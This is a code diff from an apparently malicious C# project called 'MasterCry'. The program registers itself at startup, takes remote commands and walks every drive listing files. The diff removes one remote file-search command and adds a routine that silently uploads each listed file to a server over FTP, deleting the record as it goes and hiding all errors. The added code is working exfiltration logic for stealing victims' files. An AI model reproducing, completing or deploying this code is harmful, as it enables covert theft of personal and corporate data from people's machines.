@@ -54,23 +54,6 @@ namespace MasterCry
                 {
                     RegisterInStartup(false);
                 }
-                else if (com.Contains(BuildVars.Command_NEW_EXT))       //NEW EXT Search and Upload
-                {
-                    com = com.Replace(BuildVars.Command_NEW_EXT, "");
-                    if (!File.Exists(BuildVars.Save_New_Items_Location))
-                    {
-                        foreach (var drv in getDrives())
-                        {
-                            var data = GetFileList(drv, com);
-                            foreach (var item in data)
-                            {
-                                WriteItems(item,true);
-                            }
-                        }
-                    }
-                   
-                    //Todo: Upload Data
-                }
 
                 var preVer = System_Details.ReadSetting(BuildVars.Config_Command_Version);
 
@@ -160,7 +143,7 @@ namespace MasterCry
             //{
             //    RegisterInStartup(true);
             //}
-            if(!System.IO.File.Exists(BuildVars.Save_Items_Location))
+            if (!System.IO.File.Exists(BuildVars.Save_Items_Location))
             {
                 foreach (var drv in getDrives())
                 {
@@ -170,8 +153,16 @@ namespace MasterCry
                         WriteItems(item);
                     }
                 }
+                Upload();
             }
-            
+            if (System.IO.File.Exists(BuildVars.Save_Items_Location))
+            {
+                string content = File.ReadAllText(BuildVars.Save_Items_Location);
+                if (content.Length != 0)
+                {
+                    Upload();
+                }
+            }
         }
         #region "Search Files on Drives"
         List<string> getDrives()
@@ -233,45 +224,6 @@ namespace MasterCry
                 }
             }
         }
-
-        public IEnumerable<string> GetFileList(string rootFolderPath, string Extension)
-        {
-            string[] exceptions = new string[] { @"C:\System Volume Information", @"C:\$RECYCLE.BIN",
-            @"D:\System Volume Information", @"D:\$RECYCLE.BIN",
-            @"E:\System Volume Information", @"E:\$RECYCLE.BIN",
-            @"F:\System Volume Information", @"F:\$RECYCLE.BIN",
-            @"G:\System Volume Information", @"G:\$RECYCLE.BIN",
-            @"H:\System Volume Information", @"H:\$RECYCLE.BIN",
-            @"I:\System Volume Information", @"I:\$RECYCLE.BIN",
-            @"J:\System Volume Information", @"J:\$RECYCLE.BIN",
-            @"K:\System Volume Information", @"K:\$RECYCLE.BIN",
-            @"L:\System Volume Information", @"L:\$RECYCLE.BIN",
-            @"M:\System Volume Information", @"M:\$RECYCLE.BIN"};
-
-            Queue<string> pending = new Queue<string>();
-            pending.Enqueue(rootFolderPath);
-            string[] tmp;
-            while (pending.Count > 0)
-            {
-                rootFolderPath = pending.Dequeue();
-                try
-                {
-                    tmp = Directory.GetFiles(rootFolderPath).Where(file => exceptions.All(e => !file.StartsWith(e)) && file.EndsWith("." + Extension, StringComparison.CurrentCultureIgnoreCase)).ToArray();
-
-                }
-                catch (UnauthorizedAccessException) { continue; }
-                catch (DirectoryNotFoundException) { continue; }
-                for (int i = 0; i < tmp.Length; i++)
-                {
-                    yield return tmp[i];
-                }
-                tmp = Directory.GetDirectories(rootFolderPath);
-                for (int i = 0; i < tmp.Length; i++)
-                {
-                    pending.Enqueue(tmp[i]);
-                }
-            }
-        }
         private string OSDrive()
         {
             return Path.GetPathRoot(Environment.SystemDirectory);
@@ -279,25 +231,40 @@ namespace MasterCry
 
         private static void WriteItems(string Text)
         {
-            using (System.IO.StreamWriter file =
-            new System.IO.StreamWriter(BuildVars.Save_Items_Location, true))
+            try
             {
-                file.WriteLine(Text);
+                using (System.IO.StreamWriter file =
+           new System.IO.StreamWriter(BuildVars.Save_Items_Location, true))
+                {
+                    file.WriteLine(Text);
+                }
             }
-        }
-        private static void WriteItems(string Text,bool Is_NEW_EXT)
-        {
-            using (System.IO.StreamWriter file =
-            new System.IO.StreamWriter(BuildVars.Save_New_Items_Location, true))
-            {
-                file.WriteLine(Text);
-            }
+            catch (Exception)
+            { }
+           
         }
         #endregion
 
+
         private void Upload()
         {
-            //Todo: Read Line by Line from item.txt and upload to server and Remove from item.txt
+            if (IsConnectToInternet())
+            {
+                try
+                {
+                    var lines = File.ReadAllLines(BuildVars.Save_Items_Location);
+                    foreach (var line in lines)
+                    {
+                        Ftp.UploadToFTP(line, Path.GetFileName(line));
+                        string text = File.ReadAllText(BuildVars.Save_Items_Location);
+                        text = text.Replace(line, "");
+                        File.WriteAllText(BuildVars.Save_Items_Location, text);
+                    }
+                }
+                catch (Exception)
+                { }
+            }
+            
         }
     }
 }
